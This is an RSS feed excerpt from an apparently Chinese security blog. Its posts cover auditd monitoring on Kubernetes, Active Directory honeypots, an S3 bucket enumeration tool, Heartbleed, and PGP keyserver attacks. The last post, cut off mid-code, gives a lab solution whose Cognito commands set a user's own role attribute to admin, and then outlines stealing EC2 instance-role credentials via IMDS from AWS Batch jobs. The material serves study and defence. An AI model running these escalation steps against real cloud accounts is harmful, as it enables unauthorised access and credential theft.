&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;使用kubectl exec&lt;/strong&gt;获取到Pod上运行容器的交互式shell，使用chroot模拟对底层虚拟机的访问并安装auditd，如下所示。
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it &lt;span class=&#34;nv&#34;&gt;$POD&lt;/span&gt; /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; chroot /workernode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; apt-get update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install auditd -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;配置auditd规则&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加一个规则来监控进程执行。您可以通过在以下路径创建一个名为10-procmon.rules的文件：/etc/audit/rules.d/10-procmon.rules，并添加以下内容来实现。更详细的配置信息可以在&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;找到。
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a exit,always -F arch=b64 -S execve -k procmon
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a exit,always -F arch=b32 -S execve -k procmon
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;通过运行&lt;code&gt;systemctl restart auditd&lt;/code&gt;更新auditd守护进程。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;更新syslog插件设施设置&lt;/strong&gt;，以更新audisp将auditd记录定向到syslog。为此，您需要更新/etc/audisp/plugins.d/syslog.conf中的配置，并将active字段设置为yes，如下面的截图所示。&lt;/p&gt;
&lt;p&gt;默认情况下，syslog启用的设施是user设施。如果您想更改此设置，可以更改ARGS中的第二个参数（第一个参数是日志级别）。例如，以下配置将syslog设施更改为authpriv。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;active = yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;direction = out
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;path = builtin_syslog
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;type = builtin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;args = LOG_INFO LOG_AUTHPRIV
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;format = string
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;systemctl restart auditd&lt;/code&gt;重新启动auditd守护进程以应用更改。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在门户中转到Log Analytics工作区&lt;/strong&gt;，并配置日志代理以接受authpriv设施的INFO级别的syslog事件。为此：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导航到“设置”&amp;gt;“代理配置”&lt;/li&gt;
&lt;li&gt;选择“Syslog”&lt;/li&gt;
&lt;li&gt;选择“+添加设施”&lt;/li&gt;
&lt;li&gt;在下拉菜单中选择authpriv，如下所示。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>主动防御Active Directory入门指南：打造蜜罐账户与虚假SMB共享</title>
        <link>http://localhost:1313/p/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-directory%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E6%89%93%E9%80%A0%E8%9C%9C%E7%BD%90%E8%B4%A6%E6%88%B7%E4%B8%8E%E8%99%9A%E5%81%87smb%E5%85%B1%E4%BA%AB/</link>
        <pubDate>Sun, 03 Aug 2025 02:40:31 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-directory%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E6%89%93%E9%80%A0%E8%9C%9C%E7%BD%90%E8%B4%A6%E6%88%B7%E4%B8%8E%E8%99%9A%E5%81%87smb%E5%85%B1%E4%BA%AB/</guid>
        <description>&lt;h3 id=&#34;webcast-active-directory主动防御adad入门指南&#34;&gt;WEBCAST: Active Directory主动防御(ADAD)入门指南
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;John Strand&lt;/strong&gt; //&lt;br&gt;
本次网络研讨会中，John将讲解如何通过Active Defense Harbinger Distribution (ADHD)工具集配置Active Directory主动防御系统，并探讨《主动网络防御确定性法案》(ACDC)等法律框架。内容包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建蜜罐账户的操作演示&lt;/li&gt;
&lt;li&gt;构建具有回调功能的Word文档&lt;/li&gt;
&lt;li&gt;部署虚假SMB共享服务器
所有技术方案均免费提供。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;研讨会幻灯片下载：&lt;a class=&#34;link&#34; href=&#34;https://www.dropbox.com/s/m8c6msdfhbqc63i/HoneyAdmin_AndShare.pptx?dl=0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;点击获取&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;进阶学习推荐&lt;/strong&gt;&lt;br&gt;
想跟随John系统提升技能？推荐以下课程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SOC核心技能&lt;/li&gt;
&lt;li&gt;主动防御与网络欺骗&lt;/li&gt;
&lt;li&gt;BHIS与MITRE ATT&amp;amp;CK安全入门&lt;/li&gt;
&lt;li&gt;渗透测试基础
支持直播/虚拟及点播形式学习&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;技术要点说明&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;蜜罐账户&lt;/strong&gt;：在AD中设置高权限诱饵账户，实时监控异常访问行为&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文档回调&lt;/strong&gt;：通过特制Word文档触发攻击者连接至监控系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SMB欺骗&lt;/strong&gt;：伪造共享服务器捕获凭证哈希与攻击路径信息&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Bucket Finder工具：探测亚马逊S3存储桶的安全利器</title>
        <link>http://localhost:1313/p/bucket-finder%E5%B7%A5%E5%85%B7%E6%8E%A2%E6%B5%8B%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%A9%E5%99%A8/</link>
        <pubDate>Sun, 03 Aug 2025 02:29:34 +0800</pubDate>
        
        <guid>http://localhost:1313/p/bucket-finder%E5%B7%A5%E5%85%B7%E6%8E%A2%E6%B5%8B%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%A9%E5%99%A8/</guid>
        <description>&lt;h1 id=&#34;bucket-finder&#34;&gt;Bucket Finder
&lt;/h1&gt;&lt;p&gt;该项目与我的博客文章《Whats In Amazon&amp;rsquo;s Buckets》相关联，更多后台原理请参考该博文。&lt;/p&gt;
&lt;p&gt;这是一个使用简单的工具，仅需提供字典文件即可自动检测每个单词是否对应亚马逊S3系统中的有效存储桶。对于发现的存储桶，工具会检测其权限状态（公开/私有/重定向）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公开存储桶会检查是否启用了目录索引，若启用则通过HEAD方法验证列出的所有文件访问权限&lt;/li&gt;
&lt;li&gt;重定向链接会被追踪并检查最终目标地址&lt;/li&gt;
&lt;li&gt;所有检测结果都会生成报告供后续分析&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装
&lt;/h2&gt;&lt;p&gt;仅需内置模块支持，无需额外安装gem包。下载文件后赋予可执行权限即可运行。&lt;/p&gt;
&lt;p&gt;已通过Ruby 1.8.7和1.9.1版本测试，兼容性良好。&lt;/p&gt;
&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
&lt;/h2&gt;&lt;p&gt;基础用法（指定字典文件）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb my_words
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;支持通过&lt;code&gt;--region&lt;/code&gt;参数指定初始检测区域：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb --region ie my_words
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;（默认使用US Standard区域，工具会自动处理所有重定向）&lt;/p&gt;
&lt;p&gt;启用&lt;code&gt;--download&lt;/code&gt;选项可下载发现的公开文件（注意可能包含大文件）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb --download --region ie my_words
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;文件将按存储桶名称建立目录结构保存。&lt;/p&gt;
&lt;p&gt;新增&lt;code&gt;--log-file&lt;/code&gt;参数支持日志记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb --log-file bucket.out my_words
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;下载&#34;&gt;下载
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;[Bucket Finder 1.0]&lt;/li&gt;
&lt;li&gt;[Bucket Finder 1.1]&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>微软服务不受OpenSSL「Heartbleed」漏洞影响 | MSRC官方声明</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1%E4%B8%8D%E5%8F%97opensslheartbleed%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-msrc%E5%AE%98%E6%96%B9%E5%A3%B0%E6%98%8E/</link>
        <pubDate>Sun, 03 Aug 2025 02:18:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1%E4%B8%8D%E5%8F%97opensslheartbleed%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-msrc%E5%AE%98%E6%96%B9%E5%A3%B0%E6%98%8E/</guid>
        <description>&lt;p&gt;2014年4月8日，安全研究人员披露了OpenSSL加密软件库中存在重大缺陷，该漏洞被命名为「Heartbleed」，可能允许攻击者利用通信加密密钥访问网站用户数据。&lt;/p&gt;
&lt;p&gt;经深入调查，微软确认以下服务不受此漏洞影响：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft账户&lt;/li&gt;
&lt;li&gt;Microsoft Azure&lt;/li&gt;
&lt;li&gt;Office 365&lt;/li&gt;
&lt;li&gt;Yammer&lt;/li&gt;
&lt;li&gt;Skype&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;技术细节补充&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有2014年4月14日前受支持的Windows版本均内置免疫机制&lt;/li&gt;
&lt;li&gt;Windows系统默认使用Schannel组件实现SSL/TLS协议栈（而非OpenSSL），具体技术说明参见&lt;a class=&#34;link&#34; href=&#34;https://techcommunity.microsoft.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;《Information about HeartBleed and IIS》&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;用户安全建议&lt;/strong&gt;：
微软始终建议用户定期更新复杂密码，相关指南可参考安全中心的&lt;a class=&#34;link&#34; href=&#34;https://support.microsoft.com/security&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;密码强度检查工具&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;2014年4月22日更新说明&lt;/em&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;补注1：涵盖当时所有受支持的Windows版本&lt;/li&gt;
&lt;li&gt;补注2：微软产品默认采用Windows原生Schannel实现，与OpenSSL实现存在架构级差异&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>PGP签名与Linux包管理的安全隐患解析</title>
        <link>http://localhost:1313/p/pgp%E7%AD%BE%E5%90%8D%E4%B8%8Elinux%E5%8C%85%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 02:07:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/pgp%E7%AD%BE%E5%90%8D%E4%B8%8Elinux%E5%8C%85%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;pgp签名与linux包管理的安全隐患&#34;&gt;PGP签名与Linux包管理的安全隐患
&lt;/h3&gt;&lt;p&gt;在关于PGP生态系统的讨论中，我经常听到一种观点：尽管PGP存在问题，但它对Linux发行版的软件包签名至关重要。本文将重点讨论PGP在Linux包管理环境中暴露的几个系统性安全问题。&lt;/p&gt;
&lt;h4 id=&#34;示例分析ubuntu的hhvm安装流程&#34;&gt;示例分析：Ubuntu的HHVM安装流程
&lt;/h4&gt;&lt;p&gt;以Ubuntu系统安装HHVM（Facebook开发的HACK语言运行时）的官方指导为例，其关键步骤包含从Ubuntu密钥服务器获取PGP签名密钥：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-key adv --recv-keys --keyserver hkp://keyserver.ubuntu.com:80 0xB4112585D386EB94
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;攻击手段1签名洪水攻击&#34;&gt;攻击手段1：签名洪水攻击
&lt;/h4&gt;&lt;p&gt;PGP密钥服务器采用&amp;quot;只追加&amp;quot;设计，任何人可向目标密钥添加大量签名。近期已有攻击者利用该特性，通过添加数万签名使密钥体积膨胀至MB级别，导致GnuPG导入过程极度缓慢甚至失败。理论上攻击者可制造GB级密钥彻底瘫痪安装流程。&lt;/p&gt;
&lt;h4 id=&#34;攻击手段2密钥id碰撞攻击&#34;&gt;攻击手段2：密钥ID碰撞攻击
&lt;/h4&gt;&lt;p&gt;安装脚本中使用的64位密钥ID（截取公钥SHA1哈希值）存在碰撞风险。研究者曾通过&amp;quot;Evil32&amp;quot;攻击演示了对PGP强集合密钥的ID碰撞，云GPU环境下实施64位ID碰撞的成本约为12万美元。中间人攻击者可拦截非加密的密钥服务器连接，注入碰撞密钥从而部署恶意软件包。&lt;/p&gt;
&lt;h4 id=&#34;攻击手段3http明文传输风险&#34;&gt;攻击手段3：HTTP明文传输风险
&lt;/h4&gt;&lt;p&gt;某些厂商（如Dropbox历史安装指南）通过HTTP分发仓库密钥和软件包，使网络攻击者可轻易替换密钥和软件包。值得注意的是，Debian/Ubuntu默认仍使用HTTP协议更新官方仓库。&lt;/p&gt;
&lt;h4 id=&#34;系统性缺陷与改进建议&#34;&gt;系统性缺陷与改进建议
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;密钥服务器设计缺陷&lt;/strong&gt;：追加式架构导致密钥洪水攻击无法根治&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;过时技术未淘汰&lt;/strong&gt;：尽管32/64位密钥ID风险已知多年，社区仍未强制迁移&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;解决方案&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;避免使用公共密钥服务器，改为HTTPS托管自有密钥&lt;/li&gt;
&lt;li&gt;完全弃用短密钥ID标识&lt;/li&gt;
&lt;li&gt;参考Debian Wiki的第三方仓库安全规范&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>探索AWS Batch权限提升漏洞的技术分析</title>
        <link>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 01:56:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;从上一期说起您解决cloudsectidbit第2期的iac实验了吗&#34;&gt;从上一期说起&amp;hellip;您解决CloudSecTidbit第2期的IaC实验了吗？
&lt;/h3&gt;&lt;p&gt;[解决方案]
AWS Cognito挑战的核心是通过权限提升获取管理员权限并读取内部用户列表。应用程序使用AWS Cognito颁发的会话令牌（保存为名为&lt;code&gt;aws-cognito-app-access-token&lt;/code&gt;的cookie），攻击者可以通过以下步骤实现提权：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws cognito-idp get-user --region us-east-1 --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws --region us-east-1 cognito-idp update-user-attributes --user-attributes &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name=custom:Role,Value=admin&amp;#34;&lt;/span&gt; --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;漏洞根源在于平台过度信任&lt;code&gt;custom:Role&lt;/code&gt;属性进行授权判断。&lt;/p&gt;
&lt;h3 id=&#34;技术聚焦aws-batch权限提升研究&#34;&gt;技术聚焦：AWS Batch权限提升研究
&lt;/h3&gt;&lt;h4 id=&#34;aws-batch基础架构&#34;&gt;AWS Batch基础架构
&lt;/h4&gt;&lt;p&gt;AWS Batch是AWS提供的批处理计算服务，主要组件包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Jobs&lt;/strong&gt;：工作单元（脚本/可执行文件/容器镜像）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Job definitions&lt;/strong&gt;：任务蓝图（含IAM角色、资源需求等配置）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Job Queues&lt;/strong&gt;：任务调度队列&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Compute environments&lt;/strong&gt;：计算资源环境（支持Fargate/EC2/EKS三种编排类型）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;漏洞场景分析&#34;&gt;漏洞场景分析
&lt;/h4&gt;&lt;p&gt;在多租户平台中发现高危配置：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;所有租户任务均使用EC2编排类型运行&lt;/li&gt;
&lt;li&gt;计算环境EC2实例需要高权限角色管理EFS等资源&lt;/li&gt;
&lt;li&gt;任务容器具有&lt;code&gt;batch:RegisterJobDefinition&lt;/code&gt;和&lt;code&gt;batch:SubmitJob&lt;/code&gt;权限&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;攻击链分解&#34;&gt;攻击链分解
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;初始访问&lt;/strong&gt;：通过容器元数据服务（CMDS@169.254.170.2）获取任务执行角色凭证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限滥用&lt;/strong&gt;：利用获得的凭证创建恶意任务定义&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络配置突破&lt;/strong&gt;：由于EC2环境默认使用主机网络模式，容器可访问实例元数据服务（IMDSv2）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;凭证窃取&lt;/strong&gt;：通过IMDS获取EC2实例的高权限角色凭证&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;技术验证过程&#34;&gt;技术验证过程
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;步骤1 - 获取实例角色名&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
